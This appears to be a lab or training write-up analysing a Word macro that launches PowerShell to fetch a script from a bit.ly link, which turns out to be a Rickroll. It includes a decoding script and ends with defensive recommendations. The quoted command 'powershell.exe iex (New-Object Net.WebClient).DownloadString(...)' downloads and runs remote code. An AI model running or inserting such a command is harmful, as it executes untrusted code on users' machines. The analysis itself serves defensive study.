# Scenario #1 Analysis

First we want to check where the final URL unravels to from the URL shortener bit.ly. VirusTotal easily shows this for us:

*[image unavailable]*

Based off the extension this is likely a PowerShell script, and after analyzing the URL, we can confirm from the final URL: [urlscan.io](https://urlscan.io/responses/ca50cc0456846fc7412ef6dbe94c54e5130db5ea988f7b6f27576d22724b24a8/)

We can see some prevalence by who else is analyzing this URL from public scans:

*[image unavailable]*

Once we have the script we can start analyzing this part of the attack, and I think we’re about to get rick rolled:

*[image unavailable]*

This is a quick script to decode the encoded data variable the from the script

```python
#Imports
import base64
import gzip
from io import BytesIO

# Base64-encoded and gzipped data
data = 'The base64 chunk of data' 

# Decode the base64 string
binary_data = base64.b64decode(data)

# Decompress the gzipped data
with gzip.GzipFile(fileobj=BytesIO(binary_data)) as f:
    decompressed_data = f.read()

# Convert the decompressed data to a string
decoded_string = decompressed_data.decode('utf-8')

# Print the decoded string
print(decoded_string)
```

This is the decoded output from the script:

*[image unavailable]*

*[image unavailable]*

We also used a cyberchef recipe for easier sharing, showing the same decoded data:

*[image unavailable]*

Here’s the music being loaded in the script:

*[image unavailable]*

**Overview**

This activity clearly demonstrates a classic **malicious macro scenario**, where a Word document (**winword.exe**) likely through macros or VBA scripts, linked objects, or some other vulnerability, triggers a **PowerShell command** to download and execute content from an external source. In this case, the **CLI command** shows: ’powershell.exe iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/e0Mw9w”)’

**Findings**

- **Parent Process (winword.exe):** The Word document likely contains a macro or embedded script, a linked object, or some other vulnerability, that runs when the document is opened.
- **PowerShell Execution:** The command uses **PowerShell’s Invoke-Expression (iex)** function, which allows the execution of a string as a script.
- **Web Request:** PowerShell's **Net.WebClient.DownloadString** is used to download a script from a shortened URL (bit.ly/e0Mw9w), which redirects to the infamous Rick Astley's “Never Gonna Give You Up” Rickroll ASCII art and song.
- **Network Connection:** The **network connection count of 1** indicates that the machine makes a connection to retrieve the script over the web, in this case to stream the "Rickroll" content.

**Summary**

The PowerShell command downloaded content from a shortened URL, leading to the infamous "Rickroll" prank: ASCII dancing Rick Astley and the accompanying song. While this activity is inherently non malicious, it is a demonstration or proof of concept for other tactics used in real malicious scenarios to deliver malicious content. We would definitely recommend disabling macros by default, enabling detections for suspicious PowerShell commands, preventing execution of non-signed PowerShell scripts, and ensuring users are educated on the risks of opening unexpected documents and phishing type attacks.
